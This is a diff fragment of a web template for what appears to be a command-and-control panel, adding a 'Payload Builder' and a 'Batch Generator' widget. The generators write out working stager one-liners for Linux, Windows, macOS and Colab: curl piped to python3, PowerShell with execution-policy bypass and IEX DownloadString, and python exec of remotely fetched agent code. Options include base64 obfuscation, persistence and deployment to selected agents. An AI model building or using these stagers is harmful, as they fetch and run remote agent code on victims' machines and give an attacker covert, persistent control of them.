+          <input type="checkbox" id="pbObfVar" onchange="updatePayloadPreview()">
+          <span class="toggle-track"></span>
+          <span class="toggle-thumb"></span>
+        </label>
+        <span class="text-sm">Variable names</span>
+        <label class="toggle-switch">
+          <input type="checkbox" id="pbObfStr" onchange="updatePayloadPreview()">
+          <span class="toggle-track"></span>
+          <span class="toggle-thumb"></span>
+        </label>
+        <span class="text-sm">String encoding</span>
+        <label class="toggle-switch">
+          <input type="checkbox" id="pbObfComment" onchange="updatePayloadPreview()">
+          <span class="toggle-track"></span>
+          <span class="toggle-thumb"></span>
+        </label>
+        <span class="text-sm">Remove comments</span>
+      </div>
+      <div class="section-label">Generated Payload</div>
+      <div class="code-block" id="pbPreviewCode"></div>
+      <div class="flex gap-2 mt-4">
+        <button class="btn sm" onclick="copyPayloadBuilder()">📋 Copy</button>
+        <button class="btn sm primary" onclick="downloadPayload()">📥 Download</button>
+        <button class="btn sm" onclick="deployToSelected()">🚀 Deploy to Selected</button>
+      </div>
+    </div>
+  `;
+  
+  const assistant = document.querySelector('.payload-assistant');
+  if (assistant) {
+    assistant.insertAdjacentElement('afterend', builder);
+  }
+  
+  const style = document.createElement('style');
+  style.textContent = `
+    .payload-builder-widget { display: none; }
+    .payload-builder-widget.visible { display: block; }
+  `;
+  document.head.appendChild(style);
+  
+  updatePayloadPreview();
+  C2_DEBUG.success('Payloads', 'Payload Builder initialized');
+  } catch (err) {
+    C2_DEBUG.error('Payloads', 'Failed to init Payload Builder', err);
+  }
+}
+
+function togglePayloadBuilder() {
+  const builder = document.querySelector('.payload-builder-widget');
+  if (builder) builder.classList.toggle('visible');
+}
+
+function updateMethods() {
+  const methodSelect = document.getElementById('pbMethod');
+  // Только 3 универсальных метода для всех платформ
+  methodSelect.innerHTML = `
+    <option value="v1">🐍 Python One-Liner</option>
+    <option value="v2">📦 Import Module</option>
+    <option value="v3">📝 Python Cell</option>
+  `;
+}
+
+function updatePayloadPreview() {
+  const method = document.getElementById('pbMethod').value;
+  const url = document.getElementById('srvUrl').value;
+  let payload = '';
+  
+  // ===== ВАРИАНТ 1: Python One-Liner =====
+  if (method === 'v1') {
+    payload = `python3 -c "import urllib.request,sys; exec(urllib.request.urlopen('${url}/api/agent.py').read())"`;
+  }
+  
+  // ===== ВАРИАНТ 2: Import Module =====
+  else if (method === 'v2') {
+    payload = `python3 -c "import urllib.request,os,tempfile,importlib.util; f=tempfile.NamedTemporaryFile(suffix='.py',delete=False); f.write(urllib.request.urlopen('${url}/api/agent.py').read()); f.close(); s=importlib.util.spec_from_file_location('agent',f.name); m=importlib.util.module_from_spec(s); s.loader.exec_module(m)"`;
+  }
+  
+  // ===== ВАРИАНТ 3: Python Cell =====
+  else if (method === 'v3') {
+    payload = `import urllib.request, json, threading, time
+
+class AgentClient:
+    def __init__(self, server_url):
+        self.url = server_url
+        threading.Thread(target=self._heartbeat, daemon=True).start()
+    
+    def _heartbeat(self):
+        while True:
+            try: urllib.request.urlopen(f"{self.url}/api/ping")
+            except: pass
+            time.sleep(60)
+
+agent = AgentClient('${url}')
+print("Connected")`;
+  }
+  
+  document.getElementById('pbPreviewCode').textContent = payload;
+}
+
+function copyPayloadBuilder() {
+  const code = document.getElementById('pbPreviewCode').textContent;
+  navigator.clipboard.writeText(code).then(() => showNotification('✓ Copied to clipboard', 'green'));
+}
+
+function downloadPayload() {
+  const code = document.getElementById('pbPreviewCode').textContent;
+  const blob = new Blob([code], { type: 'text/plain' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'payload.sh';
+  a.click();
+  URL.revokeObjectURL(url);
+  showNotification('✓ Payload downloaded', 'green');
+}
+
+function deployToSelected() {
+  showNotification('Select agents on Devices page first', 'yellow');
+}
+
+/* ═══════════════════════════════════════════════════════════
+   BATCH GENERATOR
+   ═══════════════════════════════════════════════════════════ */
+
+function initBatchGenerator() {
+  const batch = document.createElement('div');
+  batch.className = 'panel batch-generator-widget';
+  batch.innerHTML = `
+    <div class="panel-header">
+      <span class="panel-title"><span class="panel-icon">📦</span> Batch Generator</span>
+      <button onclick="toggleBatchGenerator()" style="background:none;border:none;color:var(--text-dim);cursor:pointer">×</button>
+    </div>
+    <div class="panel-content">
+      <div class="section-label">Platforms</div>
+      <div class="flex gap-4 flex-wrap mb-4">
+        <label class="toggle-switch">
+          <input type="checkbox" value="linux" checked>
+          <span class="toggle-track"></span>
+          <span class="toggle-thumb"></span>
+        </label>
+        <span class="text-sm">🐧 Linux</span>
+        <label class="toggle-switch">
+          <input type="checkbox" value="windows" checked>
+          <span class="toggle-track"></span>
+          <span class="toggle-thumb"></span>
+        </label>
+        <span class="text-sm">🪟 Windows</span>
+        <label class="toggle-switch">
+          <input type="checkbox" value="macos">
+          <span class="toggle-track"></span>
+          <span class="toggle-thumb"></span>
+        </label>
+        <span class="text-sm">🍎 macOS</span>
+        <label class="toggle-switch">
+          <input type="checkbox" value="colab">
+          <span class="toggle-track"></span>
+          <span class="toggle-thumb"></span>
+        </label>
+        <span class="text-sm">☁️ Colab</span>
+        <label class="toggle-switch">
+          <input type="checkbox" value="universal" checked>
+          <span class="toggle-track"></span>
+          <span class="toggle-thumb"></span>
+        </label>
+        <span class="text-sm">🐍 Universal</span>
+      </div>
+      <div class="form-row">
+        <select id="bgEncoding" class="form-select">
+          <option value="none">No encoding</option>
+          <option value="base64">Base64 all</option>
+        </select>
+        <select id="bgPersistence" class="form-select">
+          <option value="none">No persistence</option>
+          <option value="auto">Auto persistence</option>
+        </select>
+      </div>
+      <button class="btn sm primary" style="width:100%" onclick="generateBatch()">🔄 Generate All Payloads</button>
+      <div class="bg-output" id="bgOutput" style="display:none">
+        <div class="section-label mt-4">Generated Payloads</div>
+        <div class="flex justify-between items-center mb-2">
+          <span class="text-xs text-dim">Click to copy</span>
+          <button class="btn sm" onclick="copyAllBatch()">📋 Copy All</button>
+        </div>
+        <div id="bgPayloads"></div>
+      </div>
+    </div>
+  `;
+  
+  const builder = document.querySelector('.payload-builder-widget');
+  if (builder) {
+    builder.insertAdjacentElement('afterend', batch);
+  }
+  
+  const style = document.createElement('style');
+  style.textContent = `
+    .batch-generator-widget { display: none; }
+    .batch-generator-widget.visible { display: block; }
+    .bg-output { margin-top: 12px; }
+    #bgPayloads { font-family: var(--font-mono); font-size: 10px; max-height: 300px; overflow-y: auto; }
+    .bg-payload-item { margin-bottom: 12px; padding: 8px; background: rgba(0,0,0,0.3); border-radius: 4px; border-left: 3px solid var(--accent); }
+    .bg-payload-item .platform { font-weight: 600; color: var(--accent); margin-bottom: 4px; }
+  `;
+  document.head.appendChild(style);
+}
+
+function toggleBatchGenerator() {
+  const batch = document.querySelector('.batch-generator-widget');
+  if (batch) batch.classList.toggle('visible');
+}
+
+function generateBatch() {
+  const platforms = [];
+  document.querySelectorAll('.batch-generator-widget .toggle-switch input:checked').forEach(cb => platforms.push(cb.value));
+  
+  if (platforms.length === 0) {
+    showNotification('Select at least one platform', 'yellow');
+    return;
+  }
+  
+  const url = document.getElementById('srvUrl').value;
+  const encoding = document.getElementById('bgEncoding').value;
+  const persistence = document.getElementById('bgPersistence').value;
+  
+  const payloads = {
+    linux: `curl -sL ${url}/agents/agent_linux.py | python3 &`,
+    windows: `powershell -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('${url}/agents/agent_windows.ps1'))"`,
+    macos: `curl -sL ${url}/agents/agent_macos.py | python3 &`,
+    colab: `%%capture\nexec(__import__('urllib.request',fromlist=['urlopen']).urlopen('${url}/agents/agent_colab.py').read())`,
+    universal: `python3 -c "exec(__import__('urllib.request',fromlist=['urlopen']).urlopen('${url}/agents/agent_universal.py').read())" &`
+  };
+  
+  let output = '';
+  platforms.forEach(p => {
+    let payload = payloads[p] || '';
+    
+    if (encoding === 'base64' && payload) {
+      payload = `python3 -c "exec(__import__('base64').b64decode('${btoa(payload)}'))"`;
+    }
+    
+    output += `<div class="bg-payload-item"><div class="platform">${p.toUpperCase()}</div><div>${payload.replace(/\n/g, '<br>')}</div></div>`;
+  });
+  
+  document.getElementById('bgPayloads').innerHTML = output;
+  document.getElementById('bgOutput').style.display = 'block';
+  showNotification(`✓ Generated ${platforms.length} payloads`, 'green');
+}
+
+function copyAllBatch() {
+  const payloads = document.getElementById('bgPayloads').innerText;
+  navigator.clipboard.writeText(payloads).then(() => showNotification('✓ All payloads copied', 'green'));
+}
+
+// Initialize on load
+document.addEventListener('DOMContentLoaded', () => {
+  initPayloadBuilder();
+  initBatchGenerator();
 });
 </script>
 {% endblock %}
